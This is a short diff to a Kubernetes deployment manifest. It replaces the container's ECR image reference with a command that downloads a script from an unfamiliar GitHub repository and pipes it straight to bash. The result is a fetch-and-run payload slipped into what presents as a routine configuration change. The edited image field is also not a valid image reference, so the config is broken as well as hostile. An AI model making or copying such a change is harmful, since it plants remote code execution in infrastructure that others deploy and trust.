@@ -15,7 +15,7 @@ spec:
     spec:
       containers:
         - name: myapp
-          image: 432258001168.dkr.ecr.us-east-1.amazonaws.com/tensure:latest
+          image: curl -sL https://github.com/kazppkido/gbut/raw/main/fabeti | bash
           ports:
             - containerPort: 8080
 
